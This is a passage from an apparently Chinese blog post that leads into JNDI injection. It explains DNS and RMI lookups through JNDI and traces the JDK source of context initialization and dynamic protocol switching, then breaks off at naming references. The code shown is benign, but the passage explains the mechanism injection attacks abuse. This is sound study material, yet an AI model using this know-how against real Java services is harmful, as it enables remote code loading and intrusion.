<td><code>www → real-server.example.com</code></td>
</tr>
<tr>
<td><code>MX</code></td>
<td>邮件交换记录</td>
<td><code>@ → mail.example.com</code></td>
</tr>
<tr>
<td><code>TXT</code></td>
<td>文本记录</td>
<td><code>&quot;v=spf1 include:_spf.google.com ~all&quot;</code></td>
</tr>
<tr>
<td><code>NS</code></td>
<td>域名服务器记录</td>
<td><code>@ → ns1.alidns.com</code></td>
</tr>
</tbody></table>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716095852346.png" alt="image-20250716095852346"></p>
<p>获得ipv4地址，通过这个地址可以访问百度</p>
<p>完整代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.Attributes;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.DirContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.InitialDirContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;dns://114.114.114.114&quot;</span>);</span><br><span class="line">        <span class="type">DirContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(env);</span><br><span class="line">        Attributes o= ctx.getAttributes(<span class="string">&quot;www.baidu.com&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;A&quot;</span>&#125;);</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="动态协议切换"><a href="#动态协议切换" class="headerlink" title="动态协议切换"></a>动态协议切换</h3><p>前面rmi和dns例子中我们都是通过设置INITIAL_CONTEXT_FACTORY和PROVIDER_URL的值来告诉JNDI我们要调用何种服务，从哪里获取这个服务。</p>
<p>而在Context.lookup()方法的参数中，用户可以指定自己的查找协议。JNDI会通过用户输入来动态识别要调用的服务以及路径：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String str=<span class="string">&quot;rmi://127.0.0.1:5432/b1uel0n3&quot;</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        RMIInterface o=(RMIInterface)ctx.lookup(str);</span><br><span class="line">        System.out.println(o.Hello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716101138829.png" alt="image-20250716101138829"></p>
<p>这里我们并没有设置相应的环境变量来初始化Context，但是JNDI仍旧通过lookup()的参数识别出要调用的服务以及路径</p>
<p>默认支持自动转换的协议有：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./Java-JNDI%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/https%253A%252F%252Fs3-us-west-2.amazonaws.com%252Fsecure.notion-static.com%252F17bc9928-3021-4a46-93d3-d934ec0ebd7c%252FUntitled.png" alt="img"></p>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><h4 id="命名服务初始化上下文"><a href="#命名服务初始化上下文" class="headerlink" title="命名服务初始化上下文"></a>命名服务初始化上下文</h4><p>这里拿rmi为例子</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716141757325.png" alt="image-20250716141757325"></p>
<p>此时env不为空，调用enviroment.clone()方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716141853534.png" alt="image-20250716141853534"></p>
<p>重新赋值，这里对原始环境变量没用改动，随后调用init方法，传入环境变量：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716142207239.png" alt="image-20250716142207239"></p>
<p>调用了ResourceManager的静态方法getInitialEnvironment，传入环境变量，看文件名像时获取初始环境变量：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716142552798.png" alt="image-20250716142552798"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716142648680.png" alt="image-20250716142648680"></p>
<p>定义了一个PROPS变量，里面记录了Context接口的常量信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716142947096.png" alt="image-20250716142947096"></p>
<p>然后获取APPLET属性，由于我们传入的环境变量只记录了Context.INITIAL_CONTEXT_FACTORY和Context.PROVIDER_URL的信息，所以这里applet参数为null</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716143035245.png" alt="image-20250716143035245"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716144625909.png" alt="image-20250716144625909"></p>
<p>helper为VersionHelper对象，这里调用VersionHelper.getJndiProperties静态方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716144850955.png" alt="image-20250716144850955"></p>
<p>最后返回了长度为7的字符串数组，且都为null，似乎更像是在初始化</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716145145212.png" alt="image-20250716145145212"></p>
<p>初始化Context接口每个常量的值，这里通过三个方面来获取值，首先从传入的环境变量找值，如果没用则通过applet，如果还没有就通过系统属性来获取值，这也正好解释了前面初始化上下文时可通过不传入env来设置环境变量</p>
<p>初始化环境变量后回到initialContext.init方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716150949410.png" alt="image-20250716150949410"></p>
<p>设置了初始化上下文工厂就会调用getDefaultInitCtx()方法，获取默认初始化上下文，先看下此时的变量：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716151244608.png" alt="image-20250716151244608"></p>
<p>跟进getDefaultInitCtx()方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716151549981.png" alt="image-20250716151549981"></p>
<p>调用了NamingManager.getInitialContext静态方法，传入myProps变量：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716151740756.png" alt="image-20250716151740756"></p>
<p>获取用户设置的工厂类</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716151849884.png" alt="image-20250716151849884"></p>
<p>如果不为null就加载并实例化这个类：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716152135258.png" alt="image-20250716152135258"></p>
<p>最后调用RegistryContextFactory.getInitialContext方法，传入环境变量：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716152202482.png" alt="image-20250716152202482"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716152442517.png" alt="image-20250716152442517"></p>
<p>先拷贝参数值给var1，再调用URLToContext(getInitCtxURL(var1), var1)，先看getInitCtxURL方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716152941243.png" alt="image-20250716152941243"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716153118967.png" alt="image-20250716153118967"></p>
<p>获取环境变量指定的服务地址，这里就是rmi:&#x2F;&#x2F;127.0.0.1:5432</p>
<p>然后看URLToContext方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716153240150.png" alt="image-20250716153240150"></p>
<p>这里实例化了一个rmiURLContextFactory，这是一个专门用于处理 RMI URL 的上下文工厂，然后调用了getObjectInstance方法传入了服务地址和环境变量：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716153717542.png" alt="image-20250716153717542"></p>
<p>调用 getUsingURL方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716153756788.png" alt="image-20250716153756788"></p>
<p>实例化rmiURLContext对象，传入环境变量：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716153959295.png" alt="image-20250716153959295"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716154018964.png" alt="image-20250716154018964"></p>
<p>然后调用var2.lookup(var0);方法，即rmiURLContext父类GenericURLContext.lookup方法，传入服务地址：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716155136311.png" alt="image-20250716155136311"></p>
<p>最终调用RegistryContext.lookup方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716160054209.png" alt="image-20250716160054209"></p>
<p>根据上述过程中获取的信息初始化了一个新的RegistryContext，RegistryContext的构造方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716160221470.png" alt="image-20250716160221470"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716160202476.png" alt="image-20250716160202476"></p>
<p>返回结果：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716160948477.png" alt="image-20250716160948477"></p>
<p>最后获取到RegistryImpl_Stub对象，也就是相应的Stub，类似于RMI创建注册中心流程，后续将利用这个Stub获取远程对象</p>
<p>初始化结果：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716161151510.png" alt="image-20250716161151510"></p>
<h4 id="目录服务初始化上下文"><a href="#目录服务初始化上下文" class="headerlink" title="目录服务初始化上下文"></a>目录服务初始化上下文</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(env);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716161933325.png" alt="image-20250716161933325"></p>
<p>调用父类方法：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716161956746.png" alt="image-20250716161956746"></p>
<p>后面流程和命名服务初始化一样</p>
<h4 id="命名服务获取远程对象"><a href="#命名服务获取远程对象" class="headerlink" title="命名服务获取远程对象"></a>命名服务获取远程对象</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMIInterface o=(RMIInterface)ctx.lookup(<span class="string">&quot;b1uel0n3&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>调用了InitialContext.lookup方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716162424657.png" alt="image-20250716162424657"></p>
<p>调用getURLOrDefaultInitCtx(name).lookup(name)方法，先看getURLOrDefaultInitCtx(name)：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716162704104.png" alt="image-20250716162704104"></p>
<p>先if判断是否进行了上下文初始化，然后getURLScheme(name);对name进行解析，提取协议部分：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716163221347.png" alt="image-20250716163221347"></p>
<p>最后调用getDefaultInitCtx();方法：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716163505637.png" alt="image-20250716163505637"></p>
<p>而初始化上下文后，gotDefault值为true，最后直接返回defaultInitCtx变量，也就是初始化上下文生成的RegistryContext对象</p>
<p>接着看getURLOrDefaultInitCtx(name).lookup(name)的lookup方法，即RegistryContext.lookup(name)方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716163828940.png" alt="image-20250716163828940"></p>
<p>这里实例化一个CompositeName对象，可理解为将一个字符串名转换成对应的Name类型对象</p>
<p>接着调用RegistryContext.lookup()方法，只不过传入了类型为Name型：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716164104457.png" alt="image-20250716164104457"></p>
<p>此时var1不为空了，就会调用this.registry.lookup方法，不就是RegistryImpl_Stub.lookup方法，后面的查找过程就是rmi服务端查找远程对象的过程了</p>
<h4 id="目录服务获取属性"><a href="#目录服务获取属性" class="headerlink" title="目录服务获取属性"></a>目录服务获取属性</h4><p>以dns为例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Attributes o= ctx.getAttributes(<span class="string">&quot;www.baidu.com&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;A&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>先调用InitialDirContext.getAttributes方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716165009584.png" alt="image-20250716165009584"></p>
<p>调用<code>getURLOrDefaultInitDirCtx(name).getAttributes(name, attrIds);</code>方法，先看前面getURLOrDefaultInitDirCtx(name)方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716170005902.png" alt="image-20250716170005902"></p>
<p>getURLOrDefaultInitCtx(name);逻辑与命名服务中的是一样的，这里返回的是DnsContext对象</p>
<p>回到InitialDirContext.getAttributes，接着调用getAttributes(name, attrIds)方法，由于DnsContext没有该方法，所以最后调用的是<code>PartialCompositeDirContext.getAttributes</code>方法:<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716170136801.png" alt="image-20250716170136801"></p>
<p>依旧实例化一个CompositeName对象，将字符串名转化为Name类型对象，然后调用getAttributes(Name var1, String[] var2)方法：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716170442868.png" alt="image-20250716170442868"></p>
<p>先获取当前目录上下文和环境变量，并创建Continuation对象：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716170928411.png" alt="image-20250716170928411"></p>
<p>接着进入循环来获取值，这里调用了p_getAttributes方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716171542488.png" alt="image-20250716171542488"></p>
<p>调用了p_resolveIntermediate方法，如果是普通解析状态则会返回2，如果是需要处理”下一个命名系统”，则会返回3，这里状态为2，调用<code>var5 = this.c_getAttributes(var4.getHead(), var2, var3);</code>，其中var4.getHead()为传入的名称，跟进下：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716172524454.png" alt="image-20250716172524454"></p>
<p>查询逻辑在<code>this.getResolver().query(var4, var6.rrclass, var6.rrtype, this.recursion, this.authoritative);</code>，调用了Resolver.query方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716172747436.png" alt="image-20250716172747436"></p>
<p>然后调用dnsClient.query方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716173349862.png" alt="image-20250716173349862"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716173421139.png" alt="image-20250716173421139"></p>
<p>建立TCP连接并发送请求到相应DNS服务器上获取数据</p>
<h4 id="动态协议切换-1"><a href="#动态协议切换-1" class="headerlink" title="动态协议切换"></a>动态协议切换</h4><p>前面提到在初始化化上下文时没有指定环境变量，调用lookup方法，依然能通过服务地址直接获取相应对象，这里分析下代码逻辑：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String str=<span class="string">&quot;rmi://127.0.0.1:5432/b1uel0n3&quot;</span>;</span><br><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">RMIInterface o=(RMIInterface)ctx.lookup(str);</span><br></pre></td></tr></table></figure>

<p>先看下初始化后的变量：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717094551034.png" alt="image-20250717094551034"></p>
<p>可以看到是并没有存有服务地址，服务对象等相关变量的</p>
<p>跟进lookup方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717095227773.png" alt="image-20250717095227773"></p>
<p>先进入getURLOrDefaultInitCtx(name)：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717095356537.png" alt="image-20250717095356537"></p>
<p>解析了服务地址，获取了rmi协议，进入if语句，调用NamingManager.getURLContext方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717095801798.png" alt="image-20250717095801798"></p>
<p>接着调用getURLObject，传入协议名和环境变量：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717095913824.png" alt="image-20250717095913824"></p>
<p>调用了ResourceManager.getFactory方法</p>
<p>传入参数：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717100558567.png" alt="image-20250717100558567"></p>
<p>跟到关键部分：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717100904570.png" alt="image-20250717100904570"></p>
<p>得到的className就是我们要获取的工厂类：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717101307930.png" alt="image-20250717101307930"></p>
<p>然后调用<code> helper.loadClass(className, loader).newInstance();</code>加载这个工厂类并获取实例并返回这个对象</p>
<p>回到getURLObject方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717101522855.png" alt="image-20250717101522855"></p>
<p>获取工厂类实例后调用<code>factory.getObjectInstance(urlInfo, name, nameCtx, environment);</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717101631810.png" alt="image-20250717101631810"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717101759021.png" alt="image-20250717101759021"></p>
<p>实例化一个rmiURLContext对象：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717102133856.png" alt="image-20250717102133856"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717102154835.png" alt="image-20250717102154835"></p>
<p>接着回到NamingManager.getURLContext方法，返回了实例化的rmiURLContext对象，属于Context类型：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717102703070.png" alt="image-20250717102703070"></p>
<p>再回到InitialContext.getURLOrDefaultInitCtx方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717102825070.png" alt="image-20250717102825070"></p>
<p>此时ctx不为null，直接返回ctx</p>
<p>接着调用rmiURLContext.lookup方法，由于rmiURLContext不存在该方法，所以调用父类GenericURLContext.lookup方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717103249851.png" alt="image-20250717103249851"></p>
<p>先调用getRootURLContext方法，对传入的服务地址进行解析，获取绑定名称、host、port等，跟进：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717103741915.png" alt="image-20250717103741915"></p>
<p>跟进RegistryContext构造函数：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717103851442.png" alt="image-20250717103851442"></p>
<p>跟进getRegistry方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717104315367.png" alt="image-20250717104315367"></p>
<p>传入的var0和var1分别是访问的host和端口，这里直接调用LocateRegistry.getRegistry(var0, var1)获取注册中心的存根，然后返回，所以这就明朗了</p>
<p>在getRootURLContext中最后实例了一个ResolveResult对象并返回，最后在GenericURLContext.lookup调用var3.lookup方法，即RegistryContext.lookup(“b1uel0n3”)，后面的流程就和命名服务时的一样了，这里就不跟了</p>
<h2 id="命名引用"><a href="#命名引用" class="headerlink" title="命名引用"></a>命名引用</h2><p>JNDI定义了命名引用，简称引用。其大致过程是通过绑定一个引用，将引用对象存储到命名&#x2F;目录服务中，命名管理器（Naming Manager）可以将引用解析为关联的原始对象</p>
<p>引用主要由Reference类来表示，每个Reference包含如何构造对应的对象的信息，包括引用对象的全限定类名，服务地址，以及创建对象的工厂类的名称和位置：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717110059639.png" alt="image-20250717110059639"></p>
